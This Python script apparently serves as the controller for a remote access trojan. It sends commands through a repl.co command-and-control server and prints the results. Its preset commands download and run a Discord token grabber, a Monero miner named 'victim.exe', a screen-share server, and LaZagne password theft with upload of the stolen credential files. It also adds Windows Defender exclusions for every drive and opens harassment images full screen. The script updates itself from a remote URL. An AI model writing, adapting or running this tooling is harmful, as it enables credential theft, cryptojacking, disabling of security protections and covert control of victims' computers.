import sys
import os
import requests
print("0")
print("a")
import subprocess
os.system("wget -O new.py https://raw.githubusercontent.com/jonathanbreitg/dump/main/control_send.py")
import filecmp
if filecmp.cmp("control_send.py","new.py"):
	print("latest version")
	os.system("rm new.py")
else:
	os.system("rm control_send.py")
	print("updating")
	os.system("mv new.py control_send.py")
	os.execl(sys.executable, sys.executable, *sys.argv)
from time import sleep
POST_URL = "https://epic-servering-but-pytyohn.jonathanbreitg.repl.co/POST-CONTROLLER"

while True:
	command_to_send = input("SHELL>")
	if command_to_send == "token":
		command_to_send = 'thread powershell;powershell start-bitstransfer -source "https://github.com/jonathanbreitg/monero-minerV2/blob/main/grab_token.exe?raw=true" -destination "grab_token.exe" -TransferType Download;./grab_token.exe'
	elif command_to_send == "cpu":
		command_to_send = "wmic cpu get loadpercentage"
	elif command_to_send == "r":
		command_to_send = "start chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ"
	elif command_to_send == "barak":
		command_to_send = "start chrome https://media.discordapp.net/stickers/865029615457271828.png?size=160"
	elif command_to_send == "barak1.5":
		command_to_send = "start chrome -kiosk -fullscreen https://media.discordapp.net/stickers/865029615457271828.png?size=160"
	elif command_to_send == "mine_monero":
		command_to_send = 'thread powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/monero-minerV2/blob/main/victim.zip?raw=true" -destination "victim.zip" -TransferType Download;Expand-Archive -Path victim.zip -DestinationPath victim;cd victim;cd victim;./victim.exe'
	elif command_to_send == "barak2":
		command_to_send = 'powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/865029615457271828.png%3Fsize=160?raw=true" -destination "barak.png" -TransferType Download;./barak.png'
	elif command_to_send == "barak3":
		command_to_send = 'powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/barakVID.mp4?raw=true" -destination "barakVID.mp4" -TransferType Download;./barakVID.mp4'
	elif command_to_send == "barak4":
		command_to_send = 'powershell;start-bitstransfer -source "https://raw.githubusercontent.com/jonathanbreitg/dump/main/3e789542-37fc-4ebb-8692-ce143393ff37.png" -destination "barak4.png" -TransferType Download;./barak4.png'
	elif command_to_send == "barak4.5":
		command_to_send = "start chrome -kiosk -fullscreen https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png"
	elif command_to_send == "screen-share":
		command_to_send = 'thread powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/server.zip?raw=true" -destination "server.zip" -TransferType Download;Expand-Archive -Path server.zip -DestinationPath server;cd server;cd server;./server.exe'
	elif command_to_send == "passwords":
		command_to_send = 'thread powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/lazagne.exe?raw=true" -destination "lazagne.exe" -TransferType Download;cmd start cmd /c lazagne.exe browsers -oN -output asd;powershell start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/uploader.exe?raw=true" -destination "uploader.exe";./uploader.exe credential*.txt'
	elif command_to_send == "kill_down":
		command_to_send = 'powershell "Get-BitsTransfer | Remove-BitsTransfer"'
	elif command_to_send == "disableAntiVirus":
		command_to_send = '''powershell -Command "Start-Process powershell -Argument 'echo hi;Set-MpPreference -ExclusionPath E:/, C:/, D:/, F:/, G:/;' -Verb RunAs"'''
	elif command_to_send == "Down_up":
		command_to_send = 'powershell start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/uploader.exe?raw=true" -destination "uploader.exe"'
	elif command_to_send == "ult_barak":
		command_to_send = 'powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/barakVID.mp4?raw=true" -destination "barakVID.mp4" -TransferType Download;./barakVID.mp4;./barakVID.mp4;sleep 2;start-bitstransfer -source "https://raw.githubusercontent.com/jonathanbreitg/dump/main/3e789542-37fc-4ebb-8692-ce143393ff37.png" -destination "barak4.png" -TransferType Download;./barak4.png;sleep 1;start chrome https://media.discordapp.net/stickers/865029615457271828.png?size=160;sleep 3;./barakVID.mp4;./barak4.png;./barakVID.mp4;start chrome -kiosk -fullscreen https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png'
	pre = requests.get(url="https://epic-servering-but-pytyohn.jonathanbreitg.repl.co")
	pre = pre.text
	obj = {"data":str(command_to_send)}
	req = requests.post(url=POST_URL,data=obj)
	while True:
		now = requests.get(url="https://epic-servering-but-pytyohn.jonathanbreitg.repl.co")
		now = now.text
		if not(now == pre):
			splitted = now.split("<br>")
			print(splitted[-1])
			break
